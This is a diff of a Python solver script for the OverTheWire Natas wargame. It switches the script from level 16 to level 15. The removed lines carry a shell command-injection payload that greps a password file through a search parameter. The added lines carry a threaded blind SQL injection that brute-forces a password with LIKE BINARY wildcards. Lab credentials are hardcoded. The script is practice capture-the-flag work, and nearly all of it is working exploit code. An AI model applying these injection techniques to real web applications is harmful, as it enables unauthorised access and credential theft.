@@ -3,52 +3,54 @@ import requests
 import concurrent.futures
 import string
 
-#Perform the request
+
 def req(x):
-    res = requests.get(url=url,auth=lvl_pass, params={'needle':f'$(grep {x} /etc/natas_webpass/natas17)Africans'})
+    res = requests.get(url=url,auth=lvl_pass, params={'username':un_base+x})
     serv = BeautifulSoup(res.text, 'html.parser').body.find('div').text.strip()
-    if "Africans" not in serv:
+    if "This user doesn't exist.View sourcecode" != serv:
         return x
     else:
         return -1
-#Find length of the password
+
+
 def findLen(num):
-    return num if req(f'-Ew .{{{num}}}') != -1 else None
-#Find the characters that appear in the password (saves time versus doing findpw() with alphanum)
+    return num if req('_'*num) != -1 else -1
+
 def filterChars(char):
-    return char if req(char) != -1 else None
-#Construct the password via a series of guesses as to the position of a given character already known
-#to appear in the string
+    return char if req(f'%{char}%') != -1 else str(-1)
+
 def findpw(g):
     global pw
-    if req(f'-E ^{pw+g}') != -1:
+    if req(pw+g+'%') != -1:
         pw +=g
         print(pw)
         return g
     else:
-        return None
+        return '-1'
 
 def main():
     threads = 30
     with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
         num = executor.map(findLen, list(range(1,40)))
     for x in num:
-        if x is not None:
+        if x > 0:
             pw_len = x
-    print(pw_len)
     with concurrent.futures.ThreadPoolExecutor(max_workers=pw_len) as executor:
         ch = executor.map(filterChars, alphanum)
     for x in ch:
-        if x is not None:
+        if x != '-1':
             filt_chars.append(x)
-    print(''.join(filt_chars))
+
     for x in range(pw_len):
         with concurrent.futures.ThreadPoolExecutor(max_workers=len(filt_chars)) as executor:
             ch = executor.map(findpw, filt_chars)
 
 
-url = 'http://natas16.natas.labs.overthewire.org'
-lvl_pass = requests.auth.HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
+
+
+url = 'http://natas15.natas.labs.overthewire.org'
+lvl_pass = requests.auth.HTTPBasicAuth('natas15','AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J')
+un_base = 'natas16" AND password LIKE BINARY "'
 alphanum = list(string.ascii_lowercase + string.ascii_uppercase + string.digits)
 filt_chars = []
 pw_len = 0
